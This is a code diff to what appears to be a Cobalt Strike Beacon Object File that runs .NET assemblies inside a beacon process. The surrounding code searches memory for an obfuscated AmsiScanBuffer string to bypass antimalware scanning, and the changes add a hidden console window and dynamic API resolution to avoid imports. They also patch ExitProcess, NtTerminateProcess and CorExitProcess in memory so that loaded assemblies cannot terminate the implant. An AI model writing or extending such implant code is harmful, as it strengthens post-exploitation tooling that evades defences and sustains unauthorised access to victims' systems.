@@ -430,7 +430,8 @@ static BOOL search_mem(MEMORY_BASIC_INFORMATION* region, _NtProtectVirtualMemory
         return 0;
     }
 
-    for (int j = 0; j < region->RegionSize - 14; j++) {  // Fixed: use actual string length
+    if (region->RegionSize < 15) return 0;
+    for (size_t j = 0; j < region->RegionSize - 14; j++) {
         unsigned char* current = ((unsigned char*)region->BaseAddress) + j;
 
         char target_name[] = "AnsiScamBaffer";
@@ -680,7 +681,14 @@ void go(IN PCHAR buffer, IN ULONG blength)
         MSVCRT$mbstowcs_s(&convertedChars, ctx.wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);
 
         // Parse arguments
-        argumentsArray = SHELL32$CommandLineToArgvW(ctx.wAssemblyArguments, &argumentCount);
+        {
+            HMODULE hShell32 = KERNEL32$LoadLibraryA("shell32.dll");
+            if (hShell32) {
+                fnCommandLineToArgvW pCommandLineToArgvW = (fnCommandLineToArgvW)KERNEL32$GetProcAddress(hShell32, "CommandLineToArgvW");
+                if (pCommandLineToArgvW)
+                    argumentsArray = pCommandLineToArgvW(ctx.wAssemblyArguments, &argumentCount);
+            }
+        }
     } else {
         // No arguments - create empty wide string
         ctx.wAssemblyArguments = (wchar_t*)MSVCRT$malloc(sizeof(wchar_t));
@@ -763,23 +771,40 @@ void go(IN PCHAR buffer, IN ULONG blength)
         return;
     }
 
-    //Attach or create console
+    //Attach or create console — but only if we're in an interactive session.
+    //Session 0 (SYSTEM) has no window station; AllocConsole + user32.dll crash there.
     BOOL attConsole = consoleExists();
 
-    if (attConsole != 1)
     {
-        frConsole = 1;
-        _AllocConsole AllocConsole = (_AllocConsole) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "AllocConsole");
-        _GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
-        AllocConsole();
+        typedef DWORD (WINAPI *fnProcessIdToSessionId)(DWORD, DWORD*);
+        fnProcessIdToSessionId pProcessIdToSessionId = (fnProcessIdToSessionId)
+            KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "ProcessIdToSessionId");
+        typedef DWORD (WINAPI *fnGetCurrentProcessId)(void);
+        fnGetCurrentProcessId pGetCurrentProcessId = (fnGetCurrentProcessId)
+            KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetCurrentProcessId");
 
-        //Hide Console Window
-        ctx.hUser32 = KERNEL32$LoadLibraryA("user32.dll");
-        if (ctx.hUser32) {
-            _ShowWindow ShowWindow = (_ShowWindow)KERNEL32$GetProcAddress(ctx.hUser32, "ShowWindow");
-            HWND wnd = GetConsoleWindow();
-            if (wnd)
-                ShowWindow(wnd, SW_HIDE);
+        DWORD sessionId = 0;
+        BOOL interactiveSession = TRUE;
+        if (pProcessIdToSessionId && pGetCurrentProcessId) {
+            pProcessIdToSessionId(pGetCurrentProcessId(), &sessionId);
+            if (sessionId == 0)
+                interactiveSession = FALSE;
+        }
+
+        if (attConsole != 1 && interactiveSession)
+        {
+            frConsole = 1;
+            _AllocConsole AllocConsole = (_AllocConsole) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "AllocConsole");
+            _GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
+            AllocConsole();
+
+            ctx.hUser32 = KERNEL32$LoadLibraryA("user32.dll");
+            if (ctx.hUser32) {
+                _ShowWindow ShowWindow = (_ShowWindow)KERNEL32$GetProcAddress(ctx.hUser32, "ShowWindow");
+                HWND wnd = GetConsoleWindow();
+                if (wnd)
+                    ShowWindow(wnd, SW_HIDE);
+            }
         }
     }
 
@@ -876,8 +901,110 @@ void go(IN PCHAR buffer, IN ULONG blength)
     long idx[1] = { 0 };
     OLEAUT32$SafeArrayPutElement(ctx.psaStaticMethodArgs, idx, &ctx.vtPsa);
 
+    //Hook ExitProcess and NtTerminateProcess to prevent .NET assemblies from killing the beacon
+    unsigned char exitOrig[8] = {0};
+    unsigned char ntTermOrig[8] = {0};
+    unsigned char corExitOrig[8] = {0};
+    BOOL exitHooked = FALSE, ntTermHooked = FALSE, corExitHooked = FALSE;
+    {
+        _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)
+            KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
+
+        void* pExit = (void*)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "ExitProcess");
+        void* pNtTerm = (void*)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtTerminateProcess");
+
+        HMODULE hMscoree = KERNEL32$GetModuleHandleA("mscoree.dll");
+        void* pCorExit = hMscoree ? (void*)KERNEL32$GetProcAddress(hMscoree, "CorExitProcess") : NULL;
+
+#ifdef _M_AMD64
+        unsigned char retPatch[] = { 0xC3 };
+        SIZE_T patchLen = 1;
+#else
+        unsigned char retPatch[] = { 0xC2, 0x04, 0x00 };
+        SIZE_T patchLen = 3;
+#endif
+        ULONG oldProt;
+        SIZE_T regionSize;
+
+        if (pExit && NtProtectVirtualMemory) {
+            MSVCRT$memcpy(exitOrig, pExit, patchLen);
+            regionSize = patchLen;
+            void* base = pExit;
+            if (NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, PAGE_EXECUTE_READWRITE, &oldProt) == 0) {
+                MSVCRT$memcpy(pExit, retPatch, patchLen);
+                NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, oldProt, &oldProt);
+                exitHooked = TRUE;
+            }
+        }
+        if (pNtTerm && NtProtectVirtualMemory) {
+            MSVCRT$memcpy(ntTermOrig, pNtTerm, patchLen);
+            regionSize = patchLen;
+            void* base = pNtTerm;
+            if (NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, PAGE_EXECUTE_READWRITE, &oldProt) == 0) {
+                MSVCRT$memcpy(pNtTerm, retPatch, patchLen);
+                NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, oldProt, &oldProt);
+                ntTermHooked = TRUE;
+            }
+        }
+        if (pCorExit && NtProtectVirtualMemory) {
+            MSVCRT$memcpy(corExitOrig, pCorExit, patchLen);
+            regionSize = patchLen;
+            void* base = pCorExit;
+            if (NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, PAGE_EXECUTE_READWRITE, &oldProt) == 0) {
+                MSVCRT$memcpy(pCorExit, retPatch, patchLen);
+                NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, oldProt, &oldProt);
+                corExitHooked = TRUE;
+            }
+        }
+    }
+
     //Invoke our .NET Method
     hr = ctx.pMethodInfo->lpVtbl->Invoke_3(ctx.pMethodInfo, ctx.obj, ctx.psaStaticMethodArgs, &ctx.retVal);
+
+    //Restore ExitProcess and NtTerminateProcess hooks
+    {
+        _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)
+            KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
+
+#ifdef _M_AMD64
+        SIZE_T patchLen = 1;
+#else
+        SIZE_T patchLen = 3;
+#endif
+        ULONG oldProt;
+        SIZE_T regionSize;
+
+        if (exitHooked) {
+            void* pExit = (void*)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "ExitProcess");
+            regionSize = patchLen;
+            void* base = pExit;
+            if (NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, PAGE_EXECUTE_READWRITE, &oldProt) == 0) {
+                MSVCRT$memcpy(pExit, exitOrig, patchLen);
+                NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, oldProt, &oldProt);
+            }
+        }
+        if (ntTermHooked) {
+            void* pNtTerm = (void*)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtTerminateProcess");
+            regionSize = patchLen;
+            void* base = pNtTerm;
+            if (NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, PAGE_EXECUTE_READWRITE, &oldProt) == 0) {
+                MSVCRT$memcpy(pNtTerm, ntTermOrig, patchLen);
+                NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, oldProt, &oldProt);
+            }
+        }
+        if (corExitHooked) {
+            HMODULE hMscoree = KERNEL32$GetModuleHandleA("mscoree.dll");
+            void* pCorExit = hMscoree ? (void*)KERNEL32$GetProcAddress(hMscoree, "CorExitProcess") : NULL;
+            if (pCorExit) {
+                regionSize = patchLen;
+                void* base = pCorExit;
+                if (NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, PAGE_EXECUTE_READWRITE, &oldProt) == 0) {
+                    MSVCRT$memcpy(pCorExit, corExitOrig, patchLen);
+                    NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&regionSize, oldProt, &oldProt);
+                }
+            }
+        }
+    }
 
     // Use hybrid reading for mailslots with improved chunking
     BOOL bufferMode = ReadSlotHybrid(ctx.returnData, ctx.returnDataSize, &ctx.mainHandle, &ctx.hEvent);
